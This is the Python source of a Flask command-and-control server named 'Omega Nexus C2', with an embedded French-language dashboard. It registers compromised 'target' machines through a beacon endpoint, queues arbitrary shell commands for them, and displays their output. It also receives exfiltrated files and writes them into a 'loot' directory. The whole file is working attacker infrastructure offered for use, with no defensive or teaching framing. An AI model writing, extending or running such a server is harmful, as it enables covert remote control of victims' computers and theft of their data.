import os
import json
import base64
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

agents = {}
agent_counter = 0

INDEX_HTML = '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Omega Nexus C2 - Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #121824; color: #e2e8f0; padding: 20px; }
        h1, h2 { color: #38bdf8; margin-bottom: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .grid { display: table; width: 100%; table-layout: fixed; margin-bottom: 30px; }
        .grid-row { display: table-row; }
        .grid-cell { display: table-cell; padding: 10px; vertical-align: top; }
        .w-30 { width: 30%; }
        .w-70 { width: 70%; }
        .card { background-color: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #334155; }
        th { background-color: #0f172a; color: #38bdf8; }
        tr:hover { background-color: #1e293b; }
        .btn { background-color: #0284c7; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn:hover { background-color: #0369a1; }
        .btn-active { background-color: #10b981; }
        .console-box { background-color: #020617; border: 1px solid #1e293b; border-radius: 6px; padding: 15px; height: 320px; overflow-y: auto; font-family: monospace; color: #4ade80; margin-bottom: 15px; white-space: pre-wrap; }
        .input-group { display: table; width: 100%; }
        .input-cell { display: table-cell; vertical-align: middle; }
        .input-cell-main { width: 85%; }
        .input-cell-btn { width: 15%; padding-left: 10px; }
        input[type="text"] { width: 100%; background-color: #0f172a; border: 1px solid #334155; border-radius: 4px; padding: 10px; color: white; }
        .status-badge { display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 0.85em; font-weight: bold; background-color: #065f46; color: #34d399; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🌌 OMEGA NEXUS C2 <span style="font-size: 0.5em; color: #94a3b8;">v1.0.0</span></h1>
        
        <div class="card" style="margin-bottom: 25px;">
            <h2>🖥️ Cibles Connectées</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Adresse IP</th>
                        <th>Plateforme</th>
                        <th>Répertoire Courant</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody id="agent-table">
                    <tr><td colspan="5" style="text-align:center; color:#94a3b8;">En attente de connexions...</td></tr>
                </tbody>
            </table>
        </div>

        <div class="grid">
            <div class="grid-row">
                <div class="grid-cell w-30">
                    <div class="card" style="height: 440px;">
                        <h2>⚙️ Statut Session</h2>
                        <div style="font-weight: bold; margin-bottom: 5px; margin-top:15px;">Session active : <span id="active-session-id" style="color:#38bdf8;">Aucune</span></div>
                        <div id="agent-details" style="font-size: 0.9em; color: #a1a1aa; line-height: 1.6; margin-top: 15px; border-top: 1px solid #334155; padding-top: 15px;">
                            Sélectionnez un appareil pour interagir.
                        </div>
                    </div>
                </div>
                <div class="grid-cell w-70">
                    <div class="card" style="height: 440px;">
                        <h2>📟 Console Intégrée</h2>
                        <div class="console-box" id="console-output">Sélectionnez une session pour ouvrir la console...</div>
                        <div class="input-group">
                            <div class="input-cell input-cell-main">
                                <input type="text" id="cmd-input" placeholder="Entrez votre commande de shell..." disabled>
                            </div>
                            <div class="input-cell input-cell-btn">
                                <button class="btn" id="send-btn" onclick="sendCommand()" style="width: 100%;" disabled>Envoyer</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentAgentId = null;

        function refreshAgents() {
            fetch('/api/agents')
                .then(r => r.json())
                .then(data => {
                    const tbody = document.getElementById('agent-table');
                    if (Object.keys(data).length === 0) {
                        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#94a3b8;">Aucun agent connecté.</td></tr>';
                        return;
                    }
                    let html = '';
                    for (let id in data) {
                        let agent = data[id];
                        let btnClass = (currentAgentId == id) ? 'btn btn-active' : 'btn';
                        html += `<tr>
                            <td><strong>#${agent.id}</strong></td>
                            <td>${agent.ip}</td>
                            <td><span class="status-badge">${agent.platform}</span></td>
                            <td style="font-family: monospace; font-size:0.9em;">${agent.cwd}</td>
                            <td><button class="${btnClass}" onclick="selectAgent('${agent.id}')">Interagir</button></td>
                        </tr>`;
                    }
                    tbody.innerHTML = html;
                });
        }

        function selectAgent(id) {
            currentAgentId = id;
            document.getElementById('active-session-id').innerText = '#' + id;
            document.getElementById('cmd-input').disabled = false;
            document.getElementById('send-btn').disabled = false;
            
            fetch('/api/agents')
                .then(r => r.json())
                .then(data => {
                    let agent = data[id];
                    document.getElementById('agent-details').innerHTML = `
                        <strong>IP Cible :</strong> ${agent.ip}<br>
                        <strong>OS :</strong> ${agent.platform}<br>
                        <strong>Répertoire :</strong><br><span style="color:#38bdf8; font-family:monospace;">${agent.cwd}</span>
                    `;
                });
            refreshAgents();
        }

        function sendCommand() {
            const input = document.getElementById('cmd-input');
            const cmd = input.value.trim();
            if (!cmd || !currentAgentId) return;

            const consoleBox = document.getElementById('console-output');
            consoleBox.innerHTML += `\n$ ${cmd}\n[*] Commande transmise, en attente de la cible...\n`;
            consoleBox.scrollTop = consoleBox.scrollHeight;

            fetch('/api/agent/' + currentAgentId + '/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command_string: cmd })
            })
            .then(r => r.json())
            .then(res => {
                if(res.status === "queued") {
                    input.value = '';
                    checkResponse(currentAgentId);
                }
            });
        }

        function checkResponse(agentId) {
            let interval = setInterval(() => {
                fetch('/api/agent/' + agentId + '/responses')
                    .then(r => r.json())
                    .then(responses => {
                        if (responses.length > 0) {
                            const lastResp = responses[responses.length - 1];
                            const consoleBox = document.getElementById('console-output');
                            if (lastResp.status === "file_data") {
                                consoleBox.innerHTML += `[+] Fichier reçu et stocké : ${lastResp.filename}\n`;
                            } else {
                                consoleBox.innerHTML += `${lastResp.data}\n`;
                            }
                            consoleBox.scrollTop = consoleBox.scrollHeight;
                            clearInterval(interval);
                            refreshAgents();
                            selectAgent(agentId);
                        }
                    });
            }, 1500);
        }

        setInterval(refreshAgents, 5000);
        window.onload = refreshAgents;
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return INDEX_HTML

@app.route('/api/agents', methods=['GET'])
def get_agents():
    return jsonify(agents)

@app.route('/api/agent/<agent_id>/command', methods=['POST'])
def post_command(agent_id):
    data = request.json
    if agent_id in agents:
        agents[agent_id]["responses"] = []
        agents[agent_id]["commands_queue"].append(data.get("command_string"))
        return jsonify({"status": "queued"})
    return jsonify({"error": "Non trouve"}), 404

@app.route('/api/agent/<agent_id>/responses', methods=['GET'])
def get_responses(agent_id):
    if agent_id in agents:
        return jsonify(agents[agent_id]["responses"])
    return jsonify({"error": "Non trouve"}), 404

@app.route('/api/beacon', methods=['POST'])
def beacon():
    global agent_counter
    data = request.json or {}
    uid = data.get("uid")
    
    if not uid or uid not in agents:
        agent_counter += 1
        uid = str(agent_counter)
        agents[uid] = {
            "id": uid,
            "ip": request.remote_addr,
            "platform": data.get("platform", "Inconnue"),
            "cwd": data.get("cwd", "."),
            "commands_queue": [],
            "responses": []
        }
        print(f"[+] Nouvel agent enregistre : #{uid} ({request.remote_addr})")

    if data.get("cwd"):
        agents[uid]["cwd"] = data.get("cwd")

    command_to_send = ""
    if agents[uid]["commands_queue"]:
        command_to_send = agents[uid]["commands_queue"].pop(0)

    return jsonify({
        "uid": uid,
        "command": command_to_send
    })

@app.route('/api/callback', methods=['POST'])
def callback():
    data = request.json or {}
    uid = data.get("uid")
    if uid in agents:
        if data.get("status") == "file_data":
            filename = data.get("filename", "output.bin")
            file_bytes = base64.b64decode(data.get("data"))
            os.makedirs("loot", exist_ok=True)
            saved_path = os.path.join("loot", f"agent_{uid}_{filename}")
            with open(saved_path, "wb") as f:
                f.write(file_bytes)
            agents[uid]["responses"].append({"status": "file_data", "filename": saved_path})
        else:
            agents[uid]["responses"].append({"status": "success", "data": data.get("data", "")})
        return jsonify({"status": "acknowledged"})
    return jsonify({"error": "Invalide"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
